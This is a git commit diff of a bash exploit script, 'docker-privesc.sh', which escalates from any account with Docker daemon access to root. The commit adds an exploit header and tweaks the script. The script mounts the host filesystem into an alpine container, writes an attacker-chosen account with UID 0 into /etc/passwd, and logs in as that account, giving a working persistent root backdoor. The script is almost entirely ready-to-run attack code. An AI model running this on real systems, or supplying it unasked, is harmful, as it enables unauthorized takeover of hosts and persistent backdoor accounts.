3020087e611dfcfb40580f296dfc0fbcf60d887d
flast101 <frederic.lastennet@gmail.com>
2020-08-12 19:28:16 +0200

    Update docker-privesc.sh

--- docker-privesc.sh
+++ docker-privesc.sh
@@ -1,9 +1,35 @@
+# Exploit Title: Docker Daemon - Local Privilege Escalation
+# Google Dork: N/A
+# Date: 12 august 2020
+# Exploit Author: flast101
+# Vendor Homepage: https://www.docker.com/
+# Software Link: https://www.docker.com/products/docker-desktop
+# Version: all 
+# Tested on: tested on version 19.03.7, build 7141c19, OS Kali 2020.2
+# CVE : N/A
+
+# This is a known trick abusing usual baddly configured machines with Docker.
+# This script obtains root privileges from any host account with access to the Docker daemon, 
+# and creates a new root user by entering it directly in the /etc/passwd file with the creds 
+# you provide. Usually this includes (but not only) accounts in the "docker" group.
+#  
+# Requirements:
+#    - Access to a shell on the target with a user which can run Docker.
+#    - The target should have either an internet connection or an image installed in Docker. Use 
+#      docker images to check and change the “alpine” image accordingly. If there is no image go 
+#      to https://hub.docker.com to get one (tar.gz file with its Dockerfile) and upload it on the 
+#      target in your working directory.
+#
+# Detailed article: https://flast101.github.io/docker-privesc
+# Contact: flast101.sec@gmail.com
+
+
 #!/bin/bash
 
 docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 ) 
 
 if [ "$docker_test" == "CONTAINER ID" ]; then
-    echo 'Please write down your new root credentials.'
+	echo 'Please write down your new root credentials.'
     read -p 'Choose a root user name: ' rootname
     read -s -p 'Choose a root password: ' passw
     echo ""
@@ -13,11 +39,12 @@ if [ "$docker_test" == "CONTAINER ID" ]; then
     echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
     mv new_account /tmp/new_account
     docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
-    sleep 1; echo 'Please wait...'; sleep 1; echo '...'; sleep 1; echo '...';
+    sleep 1; echo 'Please wait...'; sleep 1; echo 'Running container...'; sleep 1; echo 'Creating root user...';
     docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
-    sleep 1
+    sleep 1; echo '...'
     
-    echo 'Success! Enter you password to use your root account:'
+    echo 'Success! Root user ready. Enter your password to login as root:'
+    docker rm -f flast101.github.io
     rm /tmp/new_account
     su $rootname
 
@@ -26,6 +53,6 @@ elif [ $(id -u) -eq 0 ]; then
     exit
 
 else echo "Your account does not have permission to execute docker, aborting..."
-    exit
+	exit
 
 fi
